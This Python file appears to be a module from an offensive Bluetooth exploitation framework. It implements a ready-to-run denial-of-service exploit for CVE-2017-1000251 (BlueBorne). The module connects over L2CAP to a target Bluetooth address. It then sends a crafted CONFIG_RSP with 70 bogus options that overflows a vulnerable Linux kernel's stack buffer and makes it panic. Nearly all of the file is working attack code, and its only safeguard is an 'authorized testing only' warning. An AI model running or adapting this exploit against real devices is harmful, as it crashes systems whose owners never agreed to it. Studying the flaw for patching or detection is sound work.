"""
BlueSploit Module: BlueBorne Linux L2CAP Config DoS
EDB-ID: 42762  /  CVE-2017-1000251  (Marcin Kozlowski, 2017, DoS-only PoC)

Sends an L2CAP CONFIG_REQ followed by a CONFIG_RSP packed with 70 dummy
config options. The Linux kernel L2CAP stack (3.3-rc1 to 4.13) overflows
its on-stack option array → kernel oops / panic.

This is the DoS / unweaponised variant of the BlueBorne Linux RCE
(CVE-2017-1000251). For the full RCE see exploits/blueborne_linux_rce.

Authorized testing only, crashes the target Linux kernel.
"""

import struct
import time
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# L2CAP signaling
L2CAP_CONF_REQ  = 0x04
L2CAP_CONF_RSP  = 0x05
L2CAP_CONF_OPT_QOS = 0x06    # type used in the original PoC


def _build_conf_req() -> bytes:
    """
    L2CAP CONFIG_REQ with a single QoS option (type=0x06, len=16).
    Mirrors `L2CAP_ConfReq(type=0x06,length=16,...)` from the PoC.
    """
    # cmd_hdr: code(1)=CONF_REQ, ident(1)=1, len(2)
    # body: dcid(2)=0, flags(2)=0, then option (type, len, ...22 bytes...)
    dcid     = 0
    flags    = 0
    # Option body: servicetype(1) + sdusize(2) + sduarrtime(4) + accesslat(4) + flushtime(4)
    opt_body = struct.pack("<BHIII", 0x00,
                           0xFFFF,           # sdusize
                           0xFFFFFFFF,       # sduarrtime
                           0xFFFFFFFF,       # accesslat
                           0xFFFFFFFF)       # flushtime  (15 bytes)
    # type/length/identifier prefix from original PoC packet (3 bytes)
    opt_prefix = struct.pack("<BBB", L2CAP_CONF_OPT_QOS, 16, 1)
    body  = struct.pack("<HH", dcid, flags) + opt_prefix + opt_body
    cmd   = struct.pack("<BBH", L2CAP_CONF_REQ, 1, len(body)) + body
    return cmd


def _build_conf_rsp(num_options: int = 70) -> bytes:
    """
    L2CAP CONFIG_RSP carrying `num_options` bogus 4-byte options
    (type=1, len=2, value=2000). Mirrors the 70-option payload from the PoC.
    Each option is 4 bytes → total 70 * 4 = 280 bytes which overflows
    the kernel-side options buffer.
    """
    # response header: scid(2) + flags(2) + result(2)
    rsp_hdr  = struct.pack("<HHH", 0, 0, 0x0004)   # result=0x04 (rejected/unknown)
    options  = b""
    for _ in range(num_options):
        options += struct.pack("<BBH", 0x01, 0x02, 2000)   # type=MTU, len=2, val=2000
    body = rsp_hdr + options
    cmd  = struct.pack("<BBH", L2CAP_CONF_RSP, 2, len(body)) + body
    return cmd


class Module(DosModule):
    """
    BlueBorne Linux L2CAP Config DoS (CVE-2017-1000251)

    Crashes Linux kernels 3.3-rc1 → 4.13 by overflowing the on-stack
    `l2cap_conf_*` option list during L2CAP connection setup.
    """

    info = ModuleInfo(
        name="dos/blueborne_l2cap_dos",
        description="BlueBorne Linux L2CAP config DoS (CVE-2017-1000251 / EDB-42762)",
        author=["Marcin Kozlowski (DoS PoC)", "Armis (original CVE)"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=["CVE-2017-1000251"],
        references=[
            "https://www.exploit-db.com/exploits/42762",
            "https://www.armis.com/blueborne/",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-1000251",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target", required=True,
                description="Target BD_ADDR (vulnerable Linux host)",
            ),
            "psm": ModuleOption(
                name="psm", required=False, default=1,
                description="L2CAP PSM (default 1 = SDP)",
            ),
            "options_count": ModuleOption(
                name="options_count", required=False, default=70,
                description="Number of bogus options to pack into CONF_RSP",
            ),
        }

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("Install pybluez2: pip install pybluez2")
            return False

        target  = self.target
        psm     = int(self.get_option("psm"))
        n_opts  = int(self.get_option("options_count"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET}  {C.BOLD}BlueBorne L2CAP Config DoS  CVE-2017-1000251{C.RESET}      {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        print_info(f"Target  : {target}  PSM 0x{psm:04X}")
        print_info(f"Options : {n_opts} bogus 4-byte entries  ({n_opts*4} bytes)")
        print_warning("Authorized testing only, target kernel will panic")

        sock = None
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(10)
            print_info(f"Connecting to {target}:{psm}...")
            sock.connect((target, psm))
            print_success("Connected")

            req = _build_conf_req()
            rsp = _build_conf_rsp(n_opts)

            print_info(f"Sending CONFIG_REQ  ({len(req)} bytes)")
            sock.send(req)
            time.sleep(0.1)
            print_info(f"Sending overflow CONFIG_RSP  ({len(rsp)} bytes)")
            sock.send(rsp)

            print_success("Both packets delivered. Watch target for kernel oops.")
            self.add_result({
                "target": target, "cve": "CVE-2017-1000251",
                "edb_id": 42762, "options_sent": n_opts,
                "bytes_sent": len(req) + len(rsp),
            })
            return True

        except (OSError, IOError) as e:
            err = str(e)
            if "Connection reset" in err or "Broken pipe" in err:
                print_success("Connection reset, target likely panicked")
                return True
            print_error(f"Connection error: {e}")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
